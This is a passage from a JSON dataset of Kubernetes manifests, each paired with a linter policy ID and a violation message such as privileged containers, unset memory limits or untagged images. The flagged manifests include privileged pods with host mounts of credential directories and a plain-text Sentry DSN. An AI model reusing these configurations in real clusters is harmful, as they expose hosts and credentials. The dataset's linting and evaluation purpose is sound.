    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: azure-disk-csi-driver-node\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: azure-disk-csi-driver-node\n  template:\n    metadata:\n      labels:\n        app: azure-disk-csi-driver-node\n    spec:\n      serviceAccount: azure-disk-csi-driver-node-sa\n      containers:\n      - name: csi-driver\n        securityContext:\n          privileged: true\n        image: ${DRIVER_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=${LOG_LEVEL}\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          value: /etc/kubernetes/cloud.conf\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n        - mountPath: /etc/kubernetes/\n          readOnly: true\n          name: cloud-sa-volume\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        - mountPath: /dev\n          name: device-dir\n        - mountPath: /sys/bus/scsi/devices\n          name: sys-devices-dir\n        - mountPath: /sys/class/scsi_host/\n          name: scsi-host-dir\n        ports:\n        - name: healthz\n          containerPort: 10300\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-node-driver-registrar\n        securityContext:\n          privileged: true\n        image: ${NODE_DRIVER_REGISTRAR_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/disk.csi.azure.com/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=10300\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/disk.csi.azure.com\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n        name: cloud-sa-volume\n      - hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n        name: msi\n      - hostPath:\n          path: /dev\n          type: Directory\n        name: device-dir\n      - hostPath:\n          path: /sys/bus/scsi/devices\n          type: Directory\n        name: sys-devices-dir\n      - hostPath:\n          path: /sys/class/scsi_host/\n          type: Directory\n        name: scsi-host-dir\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"csi-driver\" has memory limit 0"
  },
  {
    "id": "9238",
    "manifest_path": "data/manifests/the_stack_sample/sample_3490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: azure-disk-csi-driver-node\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: azure-disk-csi-driver-node\n  template:\n    metadata:\n      labels:\n        app: azure-disk-csi-driver-node\n    spec:\n      serviceAccount: azure-disk-csi-driver-node-sa\n      containers:\n      - name: csi-driver\n        securityContext:\n          privileged: true\n        image: ${DRIVER_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=${LOG_LEVEL}\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          value: /etc/kubernetes/cloud.conf\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n        - mountPath: /etc/kubernetes/\n          readOnly: true\n          name: cloud-sa-volume\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        - mountPath: /dev\n          name: device-dir\n        - mountPath: /sys/bus/scsi/devices\n          name: sys-devices-dir\n        - mountPath: /sys/class/scsi_host/\n          name: scsi-host-dir\n        ports:\n        - name: healthz\n          containerPort: 10300\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-node-driver-registrar\n        securityContext:\n          privileged: true\n        image: ${NODE_DRIVER_REGISTRAR_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/disk.csi.azure.com/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=10300\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/disk.csi.azure.com\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n        name: cloud-sa-volume\n      - hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n        name: msi\n      - hostPath:\n          path: /dev\n          type: Directory\n        name: device-dir\n      - hostPath:\n          path: /sys/bus/scsi/devices\n          type: Directory\n        name: sys-devices-dir\n      - hostPath:\n          path: /sys/class/scsi_host/\n          type: Directory\n        name: scsi-host-dir\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"csi-liveness-probe\" has memory limit 0"
  },
  {
    "id": "9239",
    "manifest_path": "data/manifests/the_stack_sample/sample_3490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: azure-disk-csi-driver-node\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: azure-disk-csi-driver-node\n  template:\n    metadata:\n      labels:\n        app: azure-disk-csi-driver-node\n    spec:\n      serviceAccount: azure-disk-csi-driver-node-sa\n      containers:\n      - name: csi-driver\n        securityContext:\n          privileged: true\n        image: ${DRIVER_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=${LOG_LEVEL}\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          value: /etc/kubernetes/cloud.conf\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n        - mountPath: /etc/kubernetes/\n          readOnly: true\n          name: cloud-sa-volume\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        - mountPath: /dev\n          name: device-dir\n        - mountPath: /sys/bus/scsi/devices\n          name: sys-devices-dir\n        - mountPath: /sys/class/scsi_host/\n          name: scsi-host-dir\n        ports:\n        - name: healthz\n          containerPort: 10300\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-node-driver-registrar\n        securityContext:\n          privileged: true\n        image: ${NODE_DRIVER_REGISTRAR_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/disk.csi.azure.com/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=10300\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/disk.csi.azure.com\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n        name: cloud-sa-volume\n      - hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n        name: msi\n      - hostPath:\n          path: /dev\n          type: Directory\n        name: device-dir\n      - hostPath:\n          path: /sys/bus/scsi/devices\n          type: Directory\n        name: sys-devices-dir\n      - hostPath:\n          path: /sys/class/scsi_host/\n          type: Directory\n        name: scsi-host-dir\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"csi-node-driver-registrar\" has memory limit 0"
  },
  {
    "id": "9240",
    "manifest_path": "data/manifests/the_stack_sample/sample_3491.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: csicephfs-demo-pod\nspec:\n  containers:\n  - name: web-server\n    image: nginx\n    volumeMounts:\n    - name: mypvc\n      mountPath: /var/lib/www/html\n  volumes:\n  - name: mypvc\n    persistentVolumeClaim:\n      claimName: cephfs-pvc\n      readOnly: false\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"web-server\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9241",
    "manifest_path": "data/manifests/the_stack_sample/sample_3491.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: csicephfs-demo-pod\nspec:\n  containers:\n  - name: web-server\n    image: nginx\n    volumeMounts:\n    - name: mypvc\n      mountPath: /var/lib/www/html\n  volumes:\n  - name: mypvc\n    persistentVolumeClaim:\n      claimName: cephfs-pvc\n      readOnly: false\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"web-server\" does not have a read-only root file system"
  },
  {
    "id": "9242",
    "manifest_path": "data/manifests/the_stack_sample/sample_3491.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: csicephfs-demo-pod\nspec:\n  containers:\n  - name: web-server\n    image: nginx\n    volumeMounts:\n    - name: mypvc\n      mountPath: /var/lib/www/html\n  volumes:\n  - name: mypvc\n    persistentVolumeClaim:\n      claimName: cephfs-pvc\n      readOnly: false\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"web-server\" is not set to runAsNonRoot"
  },
  {
    "id": "9243",
    "manifest_path": "data/manifests/the_stack_sample/sample_3491.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: csicephfs-demo-pod\nspec:\n  containers:\n  - name: web-server\n    image: nginx\n    volumeMounts:\n    - name: mypvc\n      mountPath: /var/lib/www/html\n  volumes:\n  - name: mypvc\n    persistentVolumeClaim:\n      claimName: cephfs-pvc\n      readOnly: false\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"web-server\" has cpu request 0"
  },
  {
    "id": "9244",
    "manifest_path": "data/manifests/the_stack_sample/sample_3491.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: csicephfs-demo-pod\nspec:\n  containers:\n  - name: web-server\n    image: nginx\n    volumeMounts:\n    - name: mypvc\n      mountPath: /var/lib/www/html\n  volumes:\n  - name: mypvc\n    persistentVolumeClaim:\n      claimName: cephfs-pvc\n      readOnly: false\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"web-server\" has memory limit 0"
  },
  {
    "id": "9245",
    "manifest_path": "data/manifests/the_stack_sample/sample_3495.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-test\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    securityContext:\n      privileged: true\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9246",
    "manifest_path": "data/manifests/the_stack_sample/sample_3495.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-test\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    securityContext:\n      privileged: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "9247",
    "manifest_path": "data/manifests/the_stack_sample/sample_3495.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-test\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    securityContext:\n      privileged: true\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"nginx\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "9248",
    "manifest_path": "data/manifests/the_stack_sample/sample_3495.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-test\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    securityContext:\n      privileged: true\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"nginx\" is privileged"
  },
  {
    "id": "9249",
    "manifest_path": "data/manifests/the_stack_sample/sample_3495.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-test\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    securityContext:\n      privileged: true\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "9250",
    "manifest_path": "data/manifests/the_stack_sample/sample_3495.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-test\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    securityContext:\n      privileged: true\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "9251",
    "manifest_path": "data/manifests/the_stack_sample/sample_3495.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-test\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    securityContext:\n      privileged: true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "9252",
    "manifest_path": "data/manifests/the_stack_sample/sample_3496.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: ixcloudservice\nspec:\n  selector:\n    app: ixcloudapp\n  type: NodePort\n  ports:\n  - protocol: TCP\n    port: 1337\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:ixcloudapp])"
  },
  {
    "id": "9253",
    "manifest_path": "data/manifests/the_stack_sample/sample_3497.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: myapp-replicaset\n  labels:\n    app: myapp\nspec:\n  selector:\n    matchLabels:\n      app: myapp\n  replicas: 3\n  template:\n    metadata:\n      name: nginx-2\n      labels:\n        app: myapp\n    spec:\n      containers:\n      - name: nginx\n        image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9254",
    "manifest_path": "data/manifests/the_stack_sample/sample_3497.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: myapp-replicaset\n  labels:\n    app: myapp\nspec:\n  selector:\n    matchLabels:\n      app: myapp\n  replicas: 3\n  template:\n    metadata:\n      name: nginx-2\n      labels:\n        app: myapp\n    spec:\n      containers:\n      - name: nginx\n        image: nginx\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9255",
    "manifest_path": "data/manifests/the_stack_sample/sample_3497.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: myapp-replicaset\n  labels:\n    app: myapp\nspec:\n  selector:\n    matchLabels:\n      app: myapp\n  replicas: 3\n  template:\n    metadata:\n      name: nginx-2\n      labels:\n        app: myapp\n    spec:\n      containers:\n      - name: nginx\n        image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "9256",
    "manifest_path": "data/manifests/the_stack_sample/sample_3497.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: myapp-replicaset\n  labels:\n    app: myapp\nspec:\n  selector:\n    matchLabels:\n      app: myapp\n  replicas: 3\n  template:\n    metadata:\n      name: nginx-2\n      labels:\n        app: myapp\n    spec:\n      containers:\n      - name: nginx\n        image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "9257",
    "manifest_path": "data/manifests/the_stack_sample/sample_3497.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: myapp-replicaset\n  labels:\n    app: myapp\nspec:\n  selector:\n    matchLabels:\n      app: myapp\n  replicas: 3\n  template:\n    metadata:\n      name: nginx-2\n      labels:\n        app: myapp\n    spec:\n      containers:\n      - name: nginx\n        image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "9258",
    "manifest_path": "data/manifests/the_stack_sample/sample_3497.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: myapp-replicaset\n  labels:\n    app: myapp\nspec:\n  selector:\n    matchLabels:\n      app: myapp\n  replicas: 3\n  template:\n    metadata:\n      name: nginx-2\n      labels:\n        app: myapp\n    spec:\n      containers:\n      - name: nginx\n        image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "9259",
    "manifest_path": "data/manifests/the_stack_sample/sample_3498.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    role: locust-master\n  name: locust-master\nspec:\n  type: ClusterIP\n  ports:\n  - port: 5557\n    name: communication\n  - port: 5558\n    name: communication-plus-1\n  - port: 8089\n    targetPort: 8089\n    name: web-ui\n  selector:\n    role: locust-master\n    app: locust-master\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:locust-master role:locust-master])"
  },
  {
    "id": "9260",
    "manifest_path": "data/manifests/the_stack_sample/sample_3499.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tindev-backend\n  labels:\n    app: tindev-backend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tindev-backend\n  template:\n    metadata:\n      labels:\n        app: tindev-backend\n    spec:\n      containers:\n      - name: tindev-backend\n        image: diegomais/tindev-backend\n        env:\n        - name: PORT\n          value: '3333'\n        - name: MONGODB_URI\n          value: mongodb://mongo-svc:27017/tindev\n        - name: SENTRY_DSN\n          value: https://09246419482a45bcb48f17a1e2ba50af@o443937.ingest.sentry.io/5418346\n        ports:\n        - containerPort: 3333\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"tindev-backend\" is using an invalid container image, \"diegomais/tindev-backend\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9261",
    "manifest_path": "data/manifests/the_stack_sample/sample_3499.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tindev-backend\n  labels:\n    app: tindev-backend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tindev-backend\n  template:\n    metadata:\n      labels:\n        app: tindev-backend\n    spec:\n      containers:\n      - name: tindev-backend\n        image: diegomais/tindev-backend\n        env:\n        - name: PORT\n          value: '3333'\n        - name: MONGODB_URI\n          value: mongodb://mongo-svc:27017/tindev\n        - name: SENTRY_DSN\n          value: https://09246419482a45bcb48f17a1e2ba50af@o443937.ingest.sentry.io/5418346\n        ports:\n        - containerPort: 3333\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tindev-backend\" does not have a read-only root file system"
  },
  {
    "id": "9262",
    "manifest_path": "data/manifests/the_stack_sample/sample_3499.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tindev-backend\n  labels:\n    app: tindev-backend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tindev-backend\n  template:\n    metadata:\n      labels:\n        app: tindev-backend\n    spec:\n      containers:\n      - name: tindev-backend\n        image: diegomais/tindev-backend\n        env:\n        - name: PORT\n          value: '3333'\n        - name: MONGODB_URI\n          value: mongodb://mongo-svc:27017/tindev\n        - name: SENTRY_DSN\n          value: https://09246419482a45bcb48f17a1e2ba50af@o443937.ingest.sentry.io/5418346\n        ports:\n        - containerPort: 3333\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tindev-backend\" is not set to runAsNonRoot"
  },
  {
    "id": "9263",
    "manifest_path": "data/manifests/the_stack_sample/sample_3499.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tindev-backend\n  labels:\n    app: tindev-backend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tindev-backend\n  template:\n    metadata:\n      labels:\n        app: tindev-backend\n    spec:\n      containers:\n      - name: tindev-backend\n        image: diegomais/tindev-backend\n        env:\n        - name: PORT\n          value: '3333'\n        - name: MONGODB_URI\n          value: mongodb://mongo-svc:27017/tindev\n        - name: SENTRY_DSN\n          value: https://09246419482a45bcb48f17a1e2ba50af@o443937.ingest.sentry.io/5418346\n        ports:\n        - containerPort: 3333\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"tindev-backend\" has cpu request 0"
  },
  {
    "id": "9264",
    "manifest_path": "data/manifests/the_stack_sample/sample_3499.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tindev-backend\n  labels:\n    app: tindev-backend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tindev-backend\n  template:\n    metadata:\n      labels:\n        app: tindev-backend\n    spec:\n      containers:\n      - name: tindev-backend\n        image: diegomais/tindev-backend\n        env:\n        - name: PORT\n          value: '3333'\n        - name: MONGODB_URI\n          value: mongodb://mongo-svc:27017/tindev\n        - name: SENTRY_DSN\n          value: https://09246419482a45bcb48f17a1e2ba50af@o443937.ingest.sentry.io/5418346\n        ports:\n        - containerPort: 3333\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"tindev-backend\" has memory limit 0"
  },
  {
    "id": "9265",
    "manifest_path": "data/manifests/the_stack_sample/sample_3506.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: oam-go\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: oam-go\n  template:\n    metadata:\n      labels:\n        app: oam-go\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '8080'\n    spec:\n      serviceAccountName: oam-go\n      containers:\n      - name: oam-operator\n        image: xtaodocker/oam-operator:1.0.2\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 8000\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8000\n          initialDelaySeconds: 3\n          periodSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8000\n          initialDelaySeconds: 3\n          periodSeconds: 5\n        resources:\n          limits:\n            memory: 512Mi\n            cpu: 1000m\n          requests:\n            memory: 32Mi\n            cpu: 10m\n        securityContext:\n          readOnlyRootFilesystem: true\n          runAsUser: 10001\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"oam-go\" not found"
  },
  {
    "id": "9266",
    "manifest_path": "data/manifests/the_stack_sample/sample_3507.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: java-goof-deployment\n  labels:\n    app: java-goof\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: java-goof\n  template:\n    metadata:\n      labels:\n        app: java-goof\n    spec:\n      containers:\n      - name: java-goof\n        image: omearaj/java-goof\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"java-goof\" is using an invalid container image, \"omearaj/java-goof\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9267",
    "manifest_path": "data/manifests/the_stack_sample/sample_3507.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: java-goof-deployment\n  labels:\n    app: java-goof\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: java-goof\n  template:\n    metadata:\n      labels:\n        app: java-goof\n    spec:\n      containers:\n      - name: java-goof\n        image: omearaj/java-goof\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9268",
    "manifest_path": "data/manifests/the_stack_sample/sample_3507.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: java-goof-deployment\n  labels:\n    app: java-goof\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: java-goof\n  template:\n    metadata:\n      labels:\n        app: java-goof\n    spec:\n      containers:\n      - name: java-goof\n        image: omearaj/java-goof\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"java-goof\" does not have a read-only root file system"
  },
  {
    "id": "9269",
    "manifest_path": "data/manifests/the_stack_sample/sample_3507.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: java-goof-deployment\n  labels:\n    app: java-goof\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: java-goof\n  template:\n    metadata:\n      labels:\n        app: java-goof\n    spec:\n      containers:\n      - name: java-goof\n        image: omearaj/java-goof\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"java-goof\" is not set to runAsNonRoot"
  },
  {
    "id": "9270",
    "manifest_path": "data/manifests/the_stack_sample/sample_3507.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: java-goof-deployment\n  labels:\n    app: java-goof\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: java-goof\n  template:\n    metadata:\n      labels:\n        app: java-goof\n    spec:\n      containers:\n      - name: java-goof\n        image: omearaj/java-goof\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"java-goof\" has cpu request 0"
  },
  {
    "id": "9271",
    "manifest_path": "data/manifests/the_stack_sample/sample_3507.yaml",
